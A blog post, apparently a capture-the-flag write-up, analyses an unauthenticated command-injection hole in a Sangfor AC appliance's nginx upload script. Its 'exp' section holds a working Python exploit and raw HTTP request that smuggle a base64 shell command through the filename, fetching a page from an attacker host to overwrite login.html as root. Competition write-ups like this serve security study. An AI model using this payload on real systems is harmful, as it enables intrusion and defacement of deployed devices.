@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>qwb 2024 rw realac</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./qwb 2024 rw realac.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">qwb 2024 rw realac</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2024-12-15]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="ti-mu-miao-shu">题目描述</h2><pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">题目信息：
+</span><span style="color:#c0c5ce;">题目名称：realAC
+</span><span style="color:#c0c5ce;">旗帜名称：rAC
+</span><span style="color:#c0c5ce;">题目描述：附件中给出了一个虚拟机，环境和展示区相同但密码不同。请实现root权限的RCE，并将展示页面的https://ip:443/login.html修改为特定主页。
+</span><span style="color:#c0c5ce;">附件信息：附件为台上相同的攻击环境（仅密码不同）。
+</span><span style="color:#c0c5ce;">台上拓扑：交换机同时连接选手攻击机和代理虚拟机，代理虚拟机与靶机相连。代理虚拟机将靶机的80,85,443,9998端口，通过端口转发的方式可被选手访问。其中代理虚拟机仅提供端口转发功能。
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">展示目标：选手携带自己的攻击机上台，接入代理虚拟机所在网段，需要在规定的时间内攻击靶机，将https://ip:443/login.html修改为特定页面。需要修改的特定页面详见附件中的login.html，选手展示时需将其中的“XXXXX”替换为自己的队伍名。
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">展示时操作人员操作步骤：
+</span><span style="color:#c0c5ce;">1）恢复虚拟机快照到初始状态；
+</span><span style="color:#c0c5ce;">2）打开虚拟机；
+</span><span style="color:#c0c5ce;">3）在靶机的浏览器中访问https://ip:443/login.html，确认虚拟机中的服务正常。
+</span><span style="color:#c0c5ce;">4）检查靶机IP,并告知选手,确认选手可以正常访问https://ip:443/login.html；80,85,443,9998端口均为开放状态；
+</span><span style="color:#c0c5ce;">5）等待选手攻击；
+</span><span style="color:#c0c5ce;">6）重新在靶机的浏览器中访问https://ip:443/login.html确认选手是否篡改了页面；
+</span><span style="color:#c0c5ce;">7）在规定时间内可以配合选手重启虚拟机；
+</span><span style="color:#c0c5ce;">8）攻击成功或超时后:恢复虚拟机快照到初始状态。
+</span></pre>
+<h2 id="1-ming-ling-zhu-ru">1 命令注入</h2><h3 id="fu-wu-fen-xi">服务分析</h3><p>内置apache和nginx  暂时先理nginx 找配置文件</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">Sangfor-AC-13.0.47 ~ # find / -name &quot;nginx.conf&quot;
+</span><span style="color:#c0c5ce;">/var/cfgroot/ac/etc/nginx/conf/nginx.conf
+</span><span style="color:#c0c5ce;">/etc/nginx/conf/nginx.conf
+</span><span style="color:#c0c5ce;">/ac/module/openresty/nginx/conf/nginx.conf
+</span><span style="color:#c0c5ce;">/ac/etc/nginx/conf/nginx.conf
+</span><span style="color:#c0c5ce;">/ac/common/cfgconvert/12.0.7/nginx/nginx.conf
+</span><span style="color:#c0c5ce;">/ac/common/cfgconvert/12.0.5/nginx/nginx.conf
+</span><span style="color:#c0c5ce;">/ac/common/cfgconvert/12.0.9/nginx/nginx.conf
+</span></pre>
+<p>实际使用的是<code>/ac/etc/nginx/conf/nginx.conf</code>
+启动需要指定到此配置文件 <code>nginx -s reload -c /ac/etc/nginx/conf/nginx.conf</code></p>
+<p>核心部分如下，定义了一个路由<code>/ingress/illegal</code>，调用<code>/ac/module/openresty/nginx/scripts/ingress_upload.lua</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">http {
+</span><span style="color:#c0c5ce;">    ...
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	server {
+</span><span style="color:#c0c5ce;">        ...
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">		# 处理分支准入上报的数据
+</span><span style="color:#c0c5ce;">		location = /ingress/illegal {
+</span><span style="color:#c0c5ce;">			# 硬限制60M
+</span><span style="color:#c0c5ce;">			client_max_body_size 60M;
+</span><span style="color:#c0c5ce;">			# 30分钟超时
+</span><span style="color:#c0c5ce;">			keepalive_timeout 1800;
+</span><span style="color:#c0c5ce;">			# 转发
+</span><span style="color:#c0c5ce;">			upload_pass @ingress_upload;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# 临时保存路径(/etc/init.d/nginx脚本里确保了此目录存在)
+</span><span style="color:#c0c5ce;">			upload_store /data/ingress_illegal/ingress_branch_data/upload_temp;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# 上传文件的权限
+</span><span style="color:#c0c5ce;">			upload_store_access all:rw;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# 去掉url中的参数
+</span><span style="color:#c0c5ce;">			upload_pass_args off;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# 这里写入http报头，pass到后台页面后能获取这里set的报头字段
+</span><span style="color:#c0c5ce;">			upload_set_form_field &quot;file_name&quot; $upload_file_name;
+</span><span style="color:#c0c5ce;">			upload_set_form_field &quot;file_content_type&quot; $upload_content_type;
+</span><span style="color:#c0c5ce;">			upload_set_form_field &quot;file_tmp_path&quot; $upload_tmp_path;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# Upload模块自动生成的一些信息，如文件大小与文件md5值
+</span><span style="color:#c0c5ce;">			upload_aggregate_form_field &quot;file_md5&quot; $upload_file_md5;
+</span><span style="color:#c0c5ce;">			upload_aggregate_form_field &quot;file_size&quot; $upload_file_size;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# 所有原始字段传到后台
+</span><span style="color:#c0c5ce;">			# upload_pass_form_field &quot;^.*$&quot;;
+</span><span style="color:#c0c5ce;">			# 每秒字节速度控制，0表示不限制
+</span><span style="color:#c0c5ce;">			upload_limit_rate 0;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			# 如果pass页面是以下状态码，就删除此次上传的临时文件
+</span><span style="color:#c0c5ce;">			upload_cleanup 400 403 404 499 500-505;
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">		location @ingress_upload {
+</span><span style="color:#c0c5ce;">			lua_need_request_body on; 
+</span><span style="color:#c0c5ce;">			content_by_lua_file &quot;/ac/module/openresty/nginx/scripts/ingress_upload.lua&quot;;
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>注意这里配置文件中</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;"># 这里写入http报头，pass到后台页面后能获取这里set的报头字段
+</span><span style="color:#c0c5ce;">upload_set_form_field &quot;file_name&quot; $upload_file_name;
+</span><span style="color:#c0c5ce;">upload_set_form_field &quot;file_content_type&quot; $upload_content_type;
+</span><span style="color:#c0c5ce;">upload_set_form_field &quot;file_tmp_path&quot; $upload_tmp_path;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Upload模块自动生成的一些信息，如文件大小与文件md5值
+</span><span style="color:#c0c5ce;">upload_aggregate_form_field &quot;file_md5&quot; $upload_file_md5;
+</span><span style="color:#c0c5ce;">upload_aggregate_form_field &quot;file_size&quot; $upload_file_size;
+</span></pre>
+<p>源于<a href="https://github.com/fdintino/nginx-upload-module">upload_module</a></p>
+<blockquote>
+<p>该模块解析请求体，存储上传到由<code>upload_store</code>指令指定的目录的所有文件。然后文件被从主体中剥离，然后更改请求被传递到由<code>upload_pass</code>指令指定的位置，从而允许任意处理上传的文件。每个文件字段都被<code>upload_set_form_field</code>指令指定的一组字段所替换</p>
+<p>然后，可以从<code>$upload_tmp_path</code>变量指定的文件中读取每个上传文件的内容，也可以将文件简单地移动到最终目的地。输出文件的移除由<code>upload_cleanup</code>指令控制。如果请求具有<code>POST</code>以外的方法，则模块返回错误<code>405 （method not allowed）</code>。使用这些方法的请求可以通过<code>error_page</code>指令在另一个位置处理</p>
+</blockquote>
+<blockquote>
+<p>Specifies a form field(s) to generate for each uploaded file in request body passed to backend. Both <code>name</code> and <code>value</code> could contain following special variables:</p>
+<ul>
+<li><code>$upload_field_name</code>: the name of original file field</li>
+<li><code>$upload_content_type</code>: the content type of file uploaded</li>
+<li><code>$upload_file_name</code>: the original name of the file being uploaded with leading path elements in DOS and UNIX notation stripped. I.e. "D:\Documents And Settings\My Dcouments\My Pictures\Picture.jpg" will be converted to "Picture.jpg" and "/etc/passwd" will be converted to "passwd".</li>
+<li><code>$upload_tmp_path</code>: the path where the content of original file is being stored to. The output file name consists 10 digits and generated with the same algorithm as in <code>proxy_temp_path</code> directive.</li>
+</ul>
+</blockquote>
+<p>所以<code>$upload_field_name</code>就是报文中上传的文件名</p>
+<p><code>/ac/module/openresty/nginx/scripts/ingress_upload.lua</code>内容如下
+没有任何鉴权，从<code>onupload()</code>中进入<code>process_file()</code>，<code>filename</code>可以命令注入</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">-- 此脚本用于处理分支上传的准入违规数据
+</span><span style="color:#65737e;">-- 就是接收文件，存放到指定目录下
+</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> sa = </span><span style="color:#96b5b4;">require</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">safeaccess</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">-- 压缩包存放路径
+</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> root_dir = &quot;</span><span style="color:#a3be8c;">/data/ingress_illegal/ingress_branch_data/compress/</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">-- 入口
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">onupload</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    ngx.req.read_body()
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">-- 获取上传的参数
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> post_args = ngx.req.get_post_args()
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> http_headers = ngx.req.get_headers()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">-- 取得参数的分界符
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> boundary = </span><span style="color:#96b5b4;">string.match</span><span style="color:#c0c5ce;">(http_headers[&quot;</span><span style="color:#a3be8c;">Content-Type</span><span style="color:#c0c5ce;">&quot;], &quot;</span><span style="color:#a3be8c;">boundary=(.*)</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">-- 解析参数，从头部取得的分解符比真正的分界符少了两个&#39;-&#39;需补上
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> table_params = get_params(post_args, &quot;</span><span style="color:#a3be8c;">--</span><span style="color:#c0c5ce;">&quot; .. boundary)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    ret_val = process_file(table_params)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">-- 处理文件后返回
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;"> ret_val == </span><span style="color:#d08770;">true </span><span style="color:#b48ead;">then
+</span><span style="color:#c0c5ce;">		ngx.say(</span><span style="color:#96b5b4;">string.format</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">md5=%s&amp;size=%s&amp;name=%s&amp;res=%s</span><span style="color:#c0c5ce;">&quot;, 
+</span><span style="color:#c0c5ce;">			table_params[&quot;</span><span style="color:#a3be8c;">file_md5</span><span style="color:#c0c5ce;">&quot;], table_params[&quot;</span><span style="color:#a3be8c;">file_size</span><span style="color:#c0c5ce;">&quot;], table_params[&quot;</span><span style="color:#a3be8c;">file_name</span><span style="color:#c0c5ce;">&quot;], &quot;</span><span style="color:#a3be8c;">ok</span><span style="color:#c0c5ce;">&quot;))
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">		ngx.status = </span><span style="color:#d08770;">403	</span><span style="color:#65737e;">-- 失败返回403 forbidden
+</span><span style="color:#c0c5ce;">		ngx.say(</span><span style="color:#96b5b4;">string.format</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">md5=%s&amp;size=%s&amp;name=%s&amp;res=%s</span><span style="color:#c0c5ce;">&quot;, 
+</span><span style="color:#c0c5ce;">			table_params[&quot;</span><span style="color:#a3be8c;">file_md5</span><span style="color:#c0c5ce;">&quot;], table_params[&quot;</span><span style="color:#a3be8c;">file_size</span><span style="color:#c0c5ce;">&quot;], table_params[&quot;</span><span style="color:#a3be8c;">file_name</span><span style="color:#c0c5ce;">&quot;], &quot;</span><span style="color:#a3be8c;">mv fail</span><span style="color:#c0c5ce;">&quot;))
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">end
+</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">-- 解析form格式的参数
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">get_params</span><span style="color:#c0c5ce;">(post_args, boundary)
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> param = &quot;&quot;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;"> k, v </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">pairs</span><span style="color:#c0c5ce;">(post_args) </span><span style="color:#b48ead;">do
+</span><span style="color:#c0c5ce;">		param = k .. &quot;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">&quot; .. v
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> params = sa.split(</span><span style="color:#96b5b4;">string.gsub</span><span style="color:#c0c5ce;">(param, &quot;</span><span style="color:#96b5b4;">\r\n</span><span style="color:#c0c5ce;">&quot;, &quot;&quot;), boundary)
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> res = {}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;"> k, v </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">pairs</span><span style="color:#c0c5ce;">(params) </span><span style="color:#b48ead;">do
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> name, data = </span><span style="color:#96b5b4;">string.match</span><span style="color:#c0c5ce;">(v, &quot;</span><span style="color:#a3be8c;">name=</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">(.+)</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">(.+)</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;"> name and data </span><span style="color:#b48ead;">then
+</span><span style="color:#c0c5ce;">			res[trim(name)] = trim(data)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> res
+</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">-- 处理临时文件
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">process_file</span><span style="color:#c0c5ce;">(params)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> filename = params[&quot;</span><span style="color:#a3be8c;">file_name</span><span style="color:#c0c5ce;">&quot;]	</span><span style="color:#65737e;">-- 压缩包的文件名
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> file_tmp_path = trim(params[&quot;</span><span style="color:#a3be8c;">file_tmp_path</span><span style="color:#c0c5ce;">&quot;])		</span><span style="color:#65737e;">-- 文件此时所在路径
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">local</span><span style="color:#c0c5ce;"> mv_command = </span><span style="color:#96b5b4;">string.format</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mv %s %s &amp;&gt; /dev/null</span><span style="color:#c0c5ce;">&quot;, file_tmp_path, root_dir .. filename)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">os.execute</span><span style="color:#c0c5ce;">(mv_command)
+</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">-- 字符串去掉空格
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">trim</span><span style="color:#c0c5ce;">(str)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;"> str ~= </span><span style="color:#d08770;">nil </span><span style="color:#b48ead;">then
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">string.gsub</span><span style="color:#c0c5ce;">(str, &quot;</span><span style="color:#a3be8c;">%s+</span><span style="color:#c0c5ce;">&quot;, &quot;&quot;)
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">nil
+</span><span style="color:#b48ead;">end
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">onupload()
+</span></pre>
+<h3 id="exp">exp</h3><p>注入命令，下载页面并覆盖原<code>login.html</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">curl -o /ac/webui/front_end/login.html http://192.168.130.1:8000/login.html
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">requests
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">url = &quot;</span><span style="color:#a3be8c;">http://192.168.130.154/ingress/illegal</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">file_content = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">This is the content of the example.txt file.</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">files = {
+</span><span style="color:#c0c5ce;">    &#39;</span><span style="color:#a3be8c;">file</span><span style="color:#c0c5ce;">&#39;: (&#39;</span><span style="color:#a3be8c;">;echo$</span><span style="color:#d08770;">{IFS}</span><span style="color:#a3be8c;">Y3VybCAtbyAvYWMvd2VidWkvZnJvbnRfZW5kL2xvZ2luLmh0bWwgaHR0cDovLzE5Mi4xNjguMTMwLjE6ODAwMC9sb2dpbi5odG1s$</span><span style="color:#d08770;">{IFS}</span><span style="color:#a3be8c;">|$</span><span style="color:#d08770;">{IFS}</span><span style="color:#a3be8c;">base64$</span><span style="color:#d08770;">{IFS}</span><span style="color:#a3be8c;">-d$</span><span style="color:#d08770;">{IFS}</span><span style="color:#a3be8c;">|$</span><span style="color:#d08770;">{IFS}</span><span style="color:#a3be8c;">sh;</span><span style="color:#c0c5ce;">&#39;, file_content, &#39;</span><span style="color:#a3be8c;">text/plain</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">response = requests.</span><span style="color:#8fa1b3;">post</span><span style="color:#c0c5ce;">(url, </span><span style="color:#bf616a;">files</span><span style="color:#c0c5ce;">=files,</span><span style="color:#bf616a;">verify</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">False</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Status Code:</span><span style="color:#c0c5ce;">&quot;, response.status_code)
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Response Body:</span><span style="color:#c0c5ce;">&quot;, response.text)
+</span></pre>
+<p>对应报文如下</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">POST /ingress/illegal HTTP/1.1
+</span><span style="color:#c0c5ce;">Host: 192.168.130.154
+</span><span style="color:#c0c5ce;">User-Agent: python-requests/2.31.0
+</span><span style="color:#c0c5ce;">Accept-Encoding: gzip, deflate
+</span><span style="color:#c0c5ce;">Accept: */*
+</span><span style="color:#c0c5ce;">Connection: close
+</span><span style="color:#c0c5ce;">Content-Length: 364
+</span><span style="color:#c0c5ce;">Content-Type: multipart/form-data; boundary=9acf1c41fd00b7590ee457afb704fa3f
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">--9acf1c41fd00b7590ee457afb704fa3f
+</span><span style="color:#c0c5ce;">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo${IFS}Y3VybCAtbyAvYWMvZGMvbGRiL2Jpbi93ZWIvdWkvbG9naW4uaHRtbCBodHRwOi8vMTkyLjE2OC4xMzAuMTo4MDAwL2xvZ2luLmh0bWw=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh;&quot;
+</span><span style="color:#c0c5ce;">Content-Type: text/plain
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">This is the content of the example.txt file.
+</span><span style="color:#c0c5ce;">--9acf1c41fd00b7590ee457afb704fa3f--
+</span><span style="color:#c0c5ce;">
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-mu-miao-shu">题目描述</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#1-ming-ling-zhu-ru">1 命令注入</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fu-wu-fen-xi">服务分析</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
